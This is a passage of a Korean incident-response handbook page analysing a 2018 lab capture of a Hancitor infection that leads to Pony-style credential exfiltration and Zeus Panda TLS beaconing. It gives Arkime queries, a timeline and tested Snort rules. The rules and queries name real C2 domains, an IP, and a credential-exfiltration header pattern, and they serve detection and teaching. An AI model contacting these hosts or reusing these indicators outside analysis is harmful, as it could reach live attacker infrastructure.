+<p><strong>결과 읽기 — 체크인(<a href="#ko-checkin">3단계</a>)과 비교:</strong></p>
+<div class="guide-table" tabindex="0" role="region" aria-label="근거 표"><table>
+<thead>
+<tr>
+<th scope="col">항목</th>
+<th scope="col">체크인 <code>/4/forum.php</code></th>
+<th scope="col">이번 POST 2개</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>HTTP 버전</td>
+<td>1.1</td>
+<td><strong>1.0</strong></td>
+</tr>
+<tr>
+<td>User-Agent</td>
+<td>IE11 (<code>rv:11.0</code>)</td>
+<td><strong>MSIE 7.0</strong></td>
+</tr>
+<tr>
+<td>본문</td>
+<td>읽을 수 있는 <code>GUID=...</code></td>
+<td><strong>암호화된 바이너리</strong></td>
+</tr>
+<tr>
+<td>특이한 헤더</td>
+<td>없음</td>
+<td><code>Content-Encoding: binary</code></td>
+</tr>
+<tr>
+<td>횟수</td>
+<td>2분마다 반복</td>
+<td><strong>딱 한 번씩</strong></td>
+</tr>
+</tbody>
+</table>
+</div>
+<ul>
+<li><strong>같은 서버, 다른 프로그램입니다.</strong> 헤더 습관이 완전히 달라요. 4단계에서 받은 파일 중 하나가 실행돼서 보낸 것으로 보입니다(마지막 다운로드 02:08:14 직후).</li>
+<li><strong><code>Content-Encoding: binary</code>는 HTTP 표준에 없는 값</strong>이에요(표준은 gzip, deflate 등). 이런 "어색한 헤더"는 특정 악성코드의 지문 같은 것이라 Snort 룰로 잡기 좋습니다. 이 헤더 조합과 <code>MSIE 7.0</code> User-Agent는 비밀번호 탈취 악성코드 <strong>Pony</strong>의 알려진 특징입니다.</li>
+<li><strong>한 번만 보내고 끝</strong>난 것도 특징이에요. Pony는 실행되면 브라우저·메일·FTP 프로그램에 저장된 비밀번호를 모아 한 번에 보내고 사라지는 경우가 많습니다.</li>
+<li><strong>보낸 양이 작습니다(합계 440바이트).</strong> 저장된 비밀번호가 적었거나 없었을 수도 있어요. 하지만 <strong>무엇이 나갔는지 확인할 수 없으니 "나갔다"고 보고</strong> faith.hoffman의 비밀번호 변경을 권고합니다. 보안에서는 모르면 나쁜 쪽으로 가정해요.</li>
+<li>보고서에는 계열 이름을 "consistent with Pony – unconfirmed" 처럼 추정으로 씁니다. 폐쇄망이라 해시 조회나 샌드박스로 확인하지 못했으니까요.</li>
+</ul>
+<hr>
+</section>
+<section>
+<h2 id="ko-tls-c2">6단계 — TLS C2: robwassotdint[.]ru와 자체 서명 인증서</h2>
+<p><strong>결과:</strong> 다운로드 2분 뒤(02:10:16)부터 PC는 <code>robwassotdint[.]ru</code>(185.174.175.14:443)에 <strong>약 5분마다 묶음으로 TLS 세션 54개</strong>를 열었습니다. 서버는 OpenSSL 기본값 그대로인 <strong>자체 서명 인증서</strong>(<code>Default Company Ltd</code>)를 썼고, PC는 약 1.65 MB를 받았어요. 내용은 암호화돼 보이지 않지만, 패턴은 은행 트로이목마(Zeus Panda Banker 유형)의 HTTPS C2와 일치합니다.</p>
+<h3 id="ko-tls-overview">6-1. TLS 전체 보기</h3>
+<p><strong>쿼리:</strong></p>
+<div class="language-text highlight"><div class="query-block"><div class="query-bar"><span class="query-type">Arkime</span><span class="query-status" role="status" data-copy-status></span><button class="query-copy" type="button" data-copy-query data-copy="copyQuery">쿼리 복사</button></div><pre tabindex="0"><code>ip.src == 10.0.14.129 &amp;&amp; protocols == tls
+</code></pre></div></div>
+<p>→ <strong>SPIView</strong> → <strong>tls</strong> 섹션과 <strong>cert</strong> 섹션(안 보이면 Load All).</p>
+<p><strong>결과:</strong></p>
+<div class="language-text highlight"><div class="query-block"><pre tabindex="0"><code>Host (SNI)    robwassotdint.ru (54)   www.google.com (1)
+Dst IP        185.174.175.14 (54)   216.58.193.68 (1)
+Version       TLSv1.2 (55)
+Cipher        TLS_RSA_WITH_AES_128_CBC_SHA256 (54)   ...(google 1)
+Cert Issuer   Default Company Ltd / Default City / XX  (54)
+              Google Internet Authority G3 (1)
+Cert Subject  Default Company Ltd / Default City / XX  (54)
+              www.google.com (1)
+Not Before    2018-04-29 19:20:31   Not After  2023-10-20 19:20:31
+</code></pre></div></div>
+<ul>
+<li><strong>SNI</strong> — TLS를 시작할 때 PC가 <strong>암호화 전에 평문으로</strong> 보내는 "접속하려는 사이트 이름"이에요. 내용은 암호화돼도 이름은 보입니다. Arkime는 SNI를 호스트 필드에 넣어서 <code>host == robwassotdint.ru</code>로도 찾을 수 있어요.</li>
+<li><strong>Issuer</strong>(발급자) — 인증서를 누가 보증했나. <strong>Subject</strong>(주체) — 인증서가 누구 것인가.</li>
+</ul>
+<p><strong>결과 읽기:</strong></p>
+<ul>
+<li><strong>Issuer와 Subject가 같습니다 = 자체 서명.</strong> 서버가 스스로 만든 인증서라서 브라우저가 보면 경고를 띄워요. 정상 웹사이트는 google처럼 공인 기관(CA)의 인증서를 씁니다.</li>
+<li><strong><code>Default Company Ltd</code>, <code>Default City</code>, 국가 <code>XX</code></strong> — OpenSSL로 인증서를 만들 때 아무것도 입력하지 않고 엔터만 치면 들어가는 <strong>기본값</strong>이에요. 서버를 대충 빨리 세운 공격자에게서 자주 보이는 모양입니다. (앞의 <a href="handbook-icedid-tds-gzip-loader-backconnect.html">IcedID 사례</a>의 <code>Internet Widgits</code>도 같은 종류예요.)</li>
+<li><strong>인증서 이름에 도메인이 없습니다.</strong> SNI는 robwassotdint[.]ru인데 인증서에는 CN도 그 이름도 없어요. 정상이라면 일치해야 합니다.</li>
+<li><strong>발급일 2018-04-29</strong> — 캡처 12일 전에 만든 새 인증서예요. 신선한 인프라도 악성의 단서입니다.</li>
+<li>인증서가 평문으로 보이는 건 이 시절(TLS 1.2)의 특징이에요. TLS 1.3에서는 인증서도 암호화돼서 보이지 않습니다.</li>
+</ul>
+<h3 id="ko-tls-pattern">6-2. 접속 패턴 보기</h3>
+<p><strong>쿼리:</strong></p>
+<div class="language-text highlight"><div class="query-block"><div class="query-bar"><span class="query-type">Arkime</span><span class="query-status" role="status" data-copy-status></span><button class="query-copy" type="button" data-copy-query data-copy="copyQuery">쿼리 복사</button></div><pre tabindex="0"><code>ip.src == 10.0.14.129 &amp;&amp; ip.dst == 185.174.175.14
+</code></pre></div></div>
+<p>→ <strong>Sessions</strong> 탭을 <strong>Start Time</strong>으로 정렬하고 <strong>Dst Bytes</strong> 열을 봅니다. 화면 위쪽의 막대 그래프(세션 수의 시간 분포)도 이 쿼리로 바뀝니다.</p>
+<p><strong>결과 (시간대별 세션 수):</strong></p>
+<div class="language-text highlight"><div class="query-block"><pre tabindex="0"><code>시각(묶음 시작)   세션 수   비고
+02:10:16          4
+02:15:20          4
+02:20:16          6
+02:25:27          4
+02:30:18          6
+02:35:35          4
+02:40:16         14         여기서 큰 다운로드: 세션당 159 – 206 KB
+02:42:27          8         세션당 최대 524 KB, 421 KB
+02:45:43          4
+합계             54         보냄 약 120 KB / 받음 약 1.65 MB
+</code></pre></div></div>
+<p><strong>결과 읽기:</strong></p>
+<ul>
+<li><strong>약 5분 간격의 묶음</strong>입니다. 묶음마다 세션이 2개씩 짝을 이루고, 작은 세션은 받은 양이 1,442바이트로 거의 똑같아요. 기계가 도는 <strong>비콘</strong>입니다.</li>
+<li><strong>02:40–02:42에 큰 세션</strong>이 몰려 있습니다. 비콘만 하던 C2가 설정 파일이나 추가 모듈을 내려보낸 것으로 보여요. 은행 트로이목마는 여기서 "어느 은행 사이트에 가짜 입력창을 끼워 넣을지(웹인젝트)"를 받습니다.</li>
+<li><strong>보낸 양(120 KB)은 받은 양(1.65 MB)보다 훨씬 적어요.</strong> 큰 유출은 보이지 않습니다. 하지만 암호화돼 있으니 작은 양의 유출(비밀번호 등)은 있었을 수 있어요.</li>
+<li><strong>시작 시간이 4단계 다운로드 직후</strong>입니다. 02:10:16에 PC가 robwassotdint[.]ru를 DC(10.0.14.3)에 물었고, 답 185.174.175.14로 곧바로 접속했어요. 다운로드 전에는 이 이름을 한 번도 묻지 않았습니다. 그래서 "다운로드한 파일이 실행돼 새 C2에 붙었다"고 판단합니다.</li>
+<li><code>www.google.com</code> TLS 1개(02:20:16)는 구글의 정상 인증서이고 한 번뿐이라 보고서에 넣지 않아요. 호스트에서 필요하면 볼 수 있도록 분석 메모에만 남깁니다.</li>
+</ul>
+<hr>
+</section>
+<section>
+<h2 id="ko-timeline">7단계 — 타임라인: 사건을 시간 순서로 잇기</h2>
+<p><strong>결과:</strong> 사용자가 로그인하고 <strong>35초 뒤에</strong> 악성 활동이 시작됐고, 그로부터 <strong>약 11초 안에</strong> 체크인, 다운로드, 유출이 모두 끝났습니다. 두 C2는 캡처가 끝날 때까지 살아 있었어요. 시간은 모두 2018-05-11 UTC입니다.</p>
+<div class="guide-table" tabindex="0" role="region" aria-label="근거 표"><table>
+<thead>
+<tr>
+<th scope="col">시각 (UTC)</th>
+<th scope="col">사건</th>
+<th scope="col">근거 (Arkime)</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>02:06:51</td>
+<td>PC 시작/네트워크 연결, DHCP REQUEST (0.0.0.0 → 브로드캐스트)</td>
+<td><code>protocols == dhcp</code></td>
+</tr>
+<tr>
+<td>02:07:02</td>
+<td>Windows 인터넷 연결 확인 (msftncsi) — 정상</td>
+<td><code>host.http == www.msftncsi.com</code></td>
+</tr>
+<tr>
+<td>02:07:29</td>
+<td><strong>faith.hoffman 로그인</strong> (Kerberos)</td>
+<td><code>protocols == krb5</code></td>
+</tr>
+<tr>
+<td>02:08:04</td>
+<td><strong>api.ipify[.]org로 공인 IP 확인</strong> → 0.5초 뒤 <strong>lysedsohap[.]com 첫 체크인</strong> (다운로드 명령 수신)</td>
+<td><code>host.http == lysedsohap.com</code></td>
+</tr>
+<tr>
+<td>02:08:05 – 02:08:15</td>
+<td><strong>wansaiful[.]com에서 암호화 파일 3개 다운로드</strong></td>
+<td><code>host.http == wansaiful.com</code></td>
+</tr>
+<tr>
+<td>02:08:12, 02:08:14</td>
+<td><strong>암호화 POST 2개</strong> <code>/mlu/forum.php</code>, <code>/d2/about.php</code> (비밀번호 유출 추정)</td>
+<td><code>http.request.content-type == application/octet-stream</code></td>
+</tr>
+<tr>
+<td>02:10:15</td>
+<td>lysedsohap[.]com 체크인 재개, 이후 약 2분마다 (<code>{n:}</code> 대기)</td>
+<td>같은 쿼리</td>
+</tr>
+<tr>
+<td>02:10:16</td>
+<td><strong>robwassotdint[.]ru 첫 DNS 질문 → 첫 TLS 세션</strong></td>
+<td><code>host == robwassotdint.ru</code></td>
+</tr>
+<tr>
+<td>02:10 – 02:45</td>
+<td>TLS 비콘 약 5분마다, 총 54세션</td>
+<td><code>ip.dst == 185.174.175.14</code></td>
+</tr>
+<tr>
+<td>02:40 – 02:42</td>
+<td><strong>TLS C2에서 큰 다운로드</strong> (세션당 최대 524 KB)</td>
+<td>Dst Bytes 열</td>
+</tr>
+<tr>
+<td>02:45:46</td>
+<td>마지막 TLS C2 세션 시작</td>
+<td>—</td>
+</tr>
+<tr>
+<td>02:48:25</td>
+<td>마지막 lysedsohap[.]com 체크인 (캡처 끝 02:49:40)</td>
+<td>—</td>
+</tr>
+</tbody>
+</table>
+</div>
+<p><strong>결과 읽기:</strong></p>
+<ul>
+<li><strong>최초 감염 경로는 이 PCAP에 없습니다.</strong> 메일, 문서 다운로드, Office 통신이 하나도 없어요. 앞 사례에서는 EXE 다운로드 직전에 Office DNS 질문이 보였는데, 이번에는 그런 단서가 없습니다.</li>
+<li><strong>가능성은 두 가지</strong>입니다. ① 캡처 전에 이미 감염되어 있었고, 로그인할 때 자동 실행(지속성)됐다. ② 로그인 직후 사용자가 이미 받아 둔 문서를 열었다. 로그인 35초 뒤라는 시간은 ①에 더 가까워 보이지만, 트래픽만으로는 구별할 수 없어요.</li>
+<li>그래서 보고서에는 "최초 감염 경로 미확인, 호스트 확인 필요"라고 쓰고, 호스트 오퍼레이터가 볼 곳(시작 프로그램, 예약 작업, 최근 연 문서, 메일 첨부 파일)을 적어 줍니다.</li>
+<li><strong>캡처에 다른 내부 PC는 없어요.</strong> 하지만 아래 정정을 보세요. DC 통신 안에 비밀번호 대입이 숨어 있었어요.</li>
+</ul>
+<p><code>Not Found</code>도 결과입니다. "찾아봤는데 트래픽에는 없었다"를 적어 두면 다음 사람이 같은 걸 다시 찾지 않아도 돼요.</p>
+<hr>
+</section>
+<section>
+<h2 id="ko-snort">8단계 — Snort 룰과 테스트 결과</h2>
+<p><strong>결과:</strong> 룰 8개를 PCAP으로 테스트했더니 모두 <strong>미리 적어 둔 예상 개수와 정확히 같은 만큼</strong> 울렸고, 정상 트래픽(DC, 구글, msftncsi)에서는 하나도 안 울렸습니다. (Snort 2.9.20, <code>HOME_NET 10.0.14.0/24</code>)</p>
+<h3 id="ko-snort-rules">룰 목록</h3>
+<div class="language-text highlight"><div class="query-block"><div class="query-bar"><span class="query-type">Snort</span><span class="query-status" role="status" data-copy-status></span><button class="query-copy" type="button" data-copy-query data-copy="copyQuery">쿼리 복사</button></div><pre tabindex="0"><code>alert tcp $HOME_NET any -&gt; $EXTERNAL_NET $HTTP_PORTS (msg:"Hancitor-style check-in POST to /4/forum.php - Sung"; flow:to_server,established; content:"POST"; http_method; content:"/4/forum.php"; http_uri; content:"GUID="; http_client_body; depth:5; content:"&amp;BUILD="; http_client_body; distance:0; content:"&amp;INFO="; http_client_body; distance:0; classtype:trojan-activity; sid:1000011; rev:1;)
+
+alert tcp $HOME_NET any -&gt; $EXTERNAL_NET $HTTP_PORTS (msg:"Hancitor follow-up payload download from wansaiful.com - Sung"; flow:to_server,established; content:"GET"; http_method; content:"/wp-content/plugins/easy-media-download/"; http_uri; content:"wansaiful.com"; http_header; classtype:trojan-activity; sid:1000012; rev:1;)
+
+alert tcp $HOME_NET any -&gt; $EXTERNAL_NET $HTTP_PORTS (msg:"Pony-style credential exfil POST with Content-Encoding binary - Sung"; flow:to_server,established; content:"POST"; http_method; content:"Content-Type|3a| application/octet-stream"; http_header; content:"Content-Encoding|3a| binary"; http_header; classtype:trojan-activity; sid:1000013; rev:1;)
+
+alert tcp $HOME_NET any -&gt; $EXTERNAL_NET 443 (msg:"TLS Client Hello SNI robwassotdint.ru (Zeus Panda C2) - Sung"; flow:to_server,established; content:"|16 03|"; depth:2; content:"|01|"; offset:5; depth:1; content:"robwassotdint.ru"; nocase; classtype:trojan-activity; sid:1000014; rev:1;)
+
+alert tcp $EXTERNAL_NET 443 -&gt; $HOME_NET any (msg:"TLS certificate with OpenSSL default subject Default Company Ltd from external server - Sung"; flow:to_client,established; content:"Default Company Ltd"; classtype:bad-unknown; sid:1000015; rev:1;)
+
+alert udp $HOME_NET any -&gt; any 53 (msg:"DNS query for Hancitor C2 lysedsohap.com - Sung"; content:"|01 00 00 01 00 00 00 00 00 00|"; offset:2; depth:10; content:"|0a|lysedsohap|03|com|00|"; nocase; distance:0; classtype:trojan-activity; sid:1000016; rev:1;)
+
+alert udp $HOME_NET any -&gt; any 53 (msg:"DNS query for Zeus Panda C2 robwassotdint.ru - Sung"; content:"|01 00 00 01 00 00 00 00 00 00|"; offset:2; depth:10; content:"|0d|robwassotdint|02|ru|00|"; nocase; distance:0; classtype:trojan-activity; sid:1000017; rev:1;)
+
+alert udp $HOME_NET any -&gt; any 53 (msg:"DNS query for Hancitor payload host wansaiful.com - Sung"; content:"|01 00 00 01 00 00 00 00 00 00|"; offset:2; depth:10; content:"|09|wansaiful|03|com|00|"; nocase; distance:0; classtype:trojan-activity; sid:1000018; rev:1;)
+</code></pre></div></div>
+<h3 id="ko-rule-anatomy">룰 하나 뜯어 보기 (sid 1000011)</h3>
+<div class="guide-table" tabindex="0" role="region" aria-label="근거 표"><table>
+<thead>
+<tr>
+<th scope="col">부분</th>
+<th scope="col">뜻</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>alert tcp</code></td>
+<td>TCP 패킷을 검사하고, 맞으면 알림</td>
+</tr>
+<tr>
+<td><code>$HOME_NET any -&gt; $EXTERNAL_NET $HTTP_PORTS</code></td>
+<td>내부 아무 포트 → 외부 웹 포트(80 등). 방향이 중요해요</td>
+</tr>
+<tr>
+<td><code>flow:to_server,established</code></td>
+<td>TCP 연결이 맺어진 뒤, 서버 쪽으로 가는 데이터만</td>
+</tr>
+<tr>
+<td><code>content:"POST"; http_method</code></td>
+<td>HTTP 메서드가 POST</td>
+</tr>
+<tr>
+<td><code>content:"/4/forum.php"; http_uri</code></td>
+<td>URI에 <code>/4/forum.php</code>가 있음</td>
+</tr>
+<tr>
+<td><code>content:"GUID="; http_client_body; depth:5</code></td>
+<td>요청 <strong>본문의 맨 앞 5바이트</strong>가 <code>GUID=</code></td>
+</tr>
+<tr>
+<td><code>content:"&amp;BUILD="; ... distance:0</code></td>
+<td>그 뒤 어딘가에 <code>&amp;BUILD=</code> (<code>distance:0</code> = 앞 조건이 끝난 곳부터 찾기)</td>
+</tr>
+<tr>
+<td><code>content:"&amp;INFO="</code></td>
+<td>그 뒤에 <code>&amp;INFO=</code></td>
+</tr>
+<tr>
+<td><code>classtype:trojan-activity</code></td>
+<td>분류: 트로이목마 활동</td>
+</tr>
+<tr>
+<td><code>sid:1000011; rev:1</code></td>
+<td>룰 번호(사용자 룰은 1000000 이상)와 수정 판</td>
+</tr>
+</tbody>
+</table>
+</div>
+<ul>
+<li><strong>왜 URI만 보지 않나요?</strong> <code>/4/forum.php</code>는 정상 게시판에도 있을 수 있는 주소예요. 본문의 <code>GUID=...&amp;BUILD=...&amp;INFO=</code> 구조까지 보면 오탐이 크게 줄고, 공격자가 도메인을 바꿔도 잡혀요.</li>
+<li><strong>sid 1000013</strong>은 도메인이나 URI 없이 어색한 헤더 조합(<code>octet-stream</code> + <code>Content-Encoding: binary</code>)만 봅니다. 이런 <strong>행동 룰</strong>은 다른 서버를 쓰는 같은 악성코드도 잡을 수 있어요.</li>
+<li><strong>sid 1000014</strong>는 TLS Client Hello(<code>|16 03|</code> = TLS 핸드셰이크, 6번째 바이트 <code>|01|</code> = Client Hello) 안의 SNI 이름을 봅니다. 암호화 전이라 보여요.</li>
+<li><strong>sid 1000015</strong>는 반대 방향(서버 → PC)의 인증서에서 <code>Default Company Ltd</code>를 찾습니다. 악성만 잡는 룰은 아니어서(테스트 서버도 이럴 수 있음) 분류를 <code>bad-unknown</code>으로 낮췄어요.</li>
+<li>DNS 룰(1000016–1000018)의 <code>|01 00 00 01 00 00 00 00 00 00|</code>는 "일반 질문 1개, 답 0개"라는 DNS 헤더예요. 그래서 <strong>질문</strong>만 잡고 답은 안 잡습니다. <code>|0a|lysedsohap|03|com|00|</code>은 DNS가 이름을 저장하는 방식(글자 수 + 글자)입니다. <code>0a</code> = 10글자 <code>lysedsohap</code>, <code>03</code> = 3글자 <code>com</code>, <code>00</code> = 끝.</li>
+</ul>
+<h3 id="ko-snort-test">테스트</h3>
+<div class="language-bash highlight"><div class="query-block"><pre tabindex="0"><code>sudo snort -T -c /etc/snort/snort.conf
+sudo snort -c /etc/snort/snort.conf -r 2018-05-11-traffic-analysis-exercise.pcap -A console -q -k none -U -l /tmp/snorttest | grep -o "\[1:[0-9]*:[0-9]*\] [^[]*" | sort | uniq -c
+</code></pre></div></div>
+<ul>
+<li><code>-T</code> — 설정과 룰 문법만 검사. <code>-r</code> — PCAP 파일을 읽음. <code>-A console</code> — 알림을 화면에 출력. <code>-q</code> — 조용히. <code>-k none</code> — 체크섬 오류가 있는 패킷도 검사(캡처 파일에는 흔함). <code>-U</code> — 시간을 UTC로.</li>
+<li><code>grep | sort | uniq -c</code> — 알림을 sid별로 세어줍니다.</li>
+</ul>
+<p><strong>결과 (예상 개수와 비교):</strong></p>
+<div class="guide-table" tabindex="0" role="region" aria-label="근거 표"><table>
+<thead>
+<tr>
+<th scope="col">sid</th>
+<th scope="col">룰</th>
+<th scope="col">예상</th>
+<th scope="col">실제</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1000011</td>
+<td>Hancitor 체크인</td>
+<td>21 (<code>/4/forum.php</code> POST)</td>
+<td><strong>21</strong></td>
+</tr>
+<tr>
+<td>1000012</td>
+<td>wansaiful.com 다운로드</td>
+<td>3 (요청 3개)</td>
+<td><strong>3</strong></td>
+</tr>
+<tr>
+<td>1000013</td>
+<td>Pony 유형 유출 POST</td>
+<td>2</td>
+<td><strong>2</strong></td>
+</tr>
+<tr>
+<td>1000014</td>
+<td>SNI robwassotdint.ru</td>
+<td>54 (TLS 세션)</td>
+<td><strong>54</strong></td>
+</tr>
+<tr>
+<td>1000015</td>
+<td><code>Default Company Ltd</code> 인증서</td>
+<td>54</td>
+<td><strong>54</strong></td>
+</tr>
+<tr>
+<td>1000016</td>
+<td>DNS lysedsohap.com</td>
+<td>2 (질문 패킷)</td>
+<td><strong>2</strong></td>
+</tr>
+<tr>
+<td>1000017</td>
+<td>DNS robwassotdint.ru</td>
+<td>2</td>
+<td><strong>2</strong></td>
+</tr>
+<tr>
+<td>1000018</td>
+<td>DNS wansaiful.com</td>
+<td>1</td>
+<td><strong>1</strong></td>
+</tr>
+</tbody>
+</table>
+</div>
+<ul>
+<li>예상 개수는 룰을 돌리기 <strong>전에</strong> Arkime(또는 tshark)에서 세어 둡니다. 실제가 더 많으면 오탐, 적으면 놓친 것이니 룰을 고칩니다.</li>
+<li>sid 1000011이 23이 아니라 21인 것도 확인하세요. 같은 서버로 간 Pony POST 2개는 <code>GUID=</code>로 시작하지 않아서 제외돼야 맞아요.</li>
+</ul>
+<hr>
+</section>
+<section>
+<h2 id="ko-query-sheet">복사용 쿼리 모음</h2>
+<p><strong>Arkime</strong></p>
+<div class="language-text highlight"><div class="query-block"><div class="query-bar"><span class="query-type">Arkime</span><span class="query-status" role="status" data-copy-status></span><button class="query-copy" type="button" data-copy-query data-copy="copyQuery">쿼리 복사</button></div><pre tabindex="0"><code>protocols == dhcp
+protocols == krb5
+protocols == dns
+protocols == http
+protocols == tls
+ip.src == 10.0.14.129 &amp;&amp; ip.dst != [10.0.0.0/8, 224.0.0.0/4, 255.255.255.255]
+ip.src == 10.0.14.129 &amp;&amp; host.http == lysedsohap.com
+ip.src == 10.0.14.129 &amp;&amp; host.http == lysedsohap.com &amp;&amp; http.uri == *4/forum.php*
+ip.src == 10.0.14.129 &amp;&amp; host.http == wansaiful.com
+ip.src == 10.0.14.129 &amp;&amp; host.http == api.ipify.org
+ip.src == 10.0.14.129 &amp;&amp; http.request.content-type == application/octet-stream
+ip.src == 10.0.14.129 &amp;&amp; host.dns == [lysedsohap.com, wansaiful.com]
+ip.src == 10.0.14.129 &amp;&amp; ip.dst == 185.174.175.14
+ip.src == 10.0.14.129 &amp;&amp; ip.dst == 185.174.175.14 &amp;&amp; port.dst == 443
+host == robwassotdint.ru
+host.dns == robwassotdint.ru
+cert.issuer.on == "Default Company Ltd"
+</code></pre></div></div>
+<p><strong>CyberChef (Hancitor C2 응답)</strong></p>
+<div class="language-text highlight"><div class="query-block"><pre tabindex="0"><code>From Base64  →  XOR (Key: 7a, HEX)
+</code></pre></div></div>
+<p><strong>분석 VM</strong></p>
+<div class="language-bash highlight"><div class="query-block"><pre tabindex="0"><code>TZ=UTC capinfos 2018-05-11-traffic-analysis-exercise.pcap
+sha256sum 2018-05-11-traffic-analysis-exercise.pcap
+tshark -r 2018-05-11-traffic-analysis-exercise.pcap --export-objects http,http_objects
+sha256sum http_objects/*
+</code></pre></div></div>
+<hr>
+</section>
+<section>
+<h2 id="ko-lessons">배운 점</h2>
+<ol>
+<li><strong>도메인 환경에서는 Kerberos가 사용자를 알려 줍니다.</strong> <code>$</code>로 끝나면 컴퓨터 계정, 없으면 사람 계정이에요. 이번에는 악성코드가 C2에 보낸 <code>INFO=</code>가 같은 사용자를 한 번 더 확인해 줬습니다.</li>
+<li><strong>정상 서비스도 악성 활동의 일부일 수 있어요.</strong> api.ipify[.]org 자체는 정상이지만, 0.5초 뒤 그 답이 C2로 갔습니다. "무엇에 접속했나"보다 "앞뒤로 무엇이 있었나"가 중요해요.</li>
+<li><strong>비콘은 간격으로 드러납니다.</strong> HTTP는 약 120초, TLS는 약 5분 묶음이었어요. Sessions 탭을 Start Time으로 정렬하고 시각만 나열해 보면 됩니다.</li>
+<li><strong>암호화돼 있어도 패턴과 메타데이터는 보입니다.</strong> TLS 내용은 못 봤지만 SNI, 자체 서명 기본값 인증서, 간격, 바이트 수만으로 C2라고 판단했어요.</li>
+<li><strong>Content-Type을 믿지 마세요.</strong> <code>text/plain</code>이라던 파일은 암호화된 바이너리였습니다. 네트워크에서 본 해시와 디스크의 해시가 다를 수 있다는 것도 보고서에 적어야 해요.</li>
+<li><strong>같은 서버라도 헤더 습관이 다르면 다른 프로그램입니다.</strong> HTTP 1.1/1.0, User-Agent, <code>Content-Encoding: binary</code> 차이로 체크인과 유출을 나눴습니다.</li>
+<li><strong>감염 사슬을 따라가세요.</strong> 다운로더(Hancitor) → 명령 → 다운로드 → 다음 악성코드(정보 탈취, 은행 트로이목마). 다운로드 직후 처음 나타나는 목적지는 거의 항상 다음 단계예요.</li>
+<li><strong>못 찾은 것도 적습니다.</strong> 최초 감염 경로는 PCAP에 없었어요. "Not Found + 호스트에서 볼 곳"을 적어서 호스트 오퍼레이터에게 넘깁니다.</li>
+</ol>
+</section>
+<section>
+<h2 id="ko-references">참고</h2>
+<ul>
+<li><a href="https://dfidwiz-sketch.github.io/dfir-handbook/ko/network/arkime/search-syntax/">Arkime 검색 문법</a> · <a href="https://dfidwiz-sketch.github.io/dfir-handbook/ko/network/arkime/offline-pcap-guide/">Arkime로 PCAP 분석하기</a></li>
+<li><a href="https://dfidwiz-sketch.github.io/dfir-handbook/ko/network/beaconing-c2/">비콘과 C2</a> · <a href="https://dfidwiz-sketch.github.io/dfir-handbook/ko/network/wireshark-tshark/">Wireshark &amp; tshark</a></li>
+<li><a href="handbook-pcap-lab-06-invoice-macro-c2.html">PCAP 실습 06 — 청구서 Word 매크로에서 Hancitor 유형 C2까지</a> · <a href="handbook-back-to-the-present-chthonic-c2-tech-support-scam.html">Back to the Present</a> · <a href="handbook-icedid-tds-gzip-loader-backconnect.html">IcedID (Cold as Ice)</a></li>
+<li><a href="https://dfidwiz-sketch.github.io/dfir-handbook/ko/blueteam/playbooks/compromised-workstation/">플레이북: 감염된 워크스테이션</a></li>
+<li>원본 실습: <a href="https://malware-traffic-analysis.net/2018/05/11/index.html">malware-traffic-analysis.net — 2018-05-11 Traffic Analysis Exercise: Night Dew</a> · <a href="https://malware-traffic-analysis.net/2018/05/11/page2.html">정답 페이지</a></li>
+<li>같은 주의 Hancitor + Zeus Panda Banker 감염 기록: <a href="https://malware-traffic-analysis.net/2018/05/14/index.html">malware-traffic-analysis.net — 2018-05-14</a></li>
+<li>같은 C2 URL(<code>/4/forum.php</code>, <code>/mlu/forum.php</code>, <code>/d2/about.php</code>)을 Hancitor/Pony C2로 정리한 공개 목록: Pastebin — HANCITOR</li>
+</ul>
+</section>
+</div>
+      </article>
+    </div>
+  </main>
+</body>
+</html>
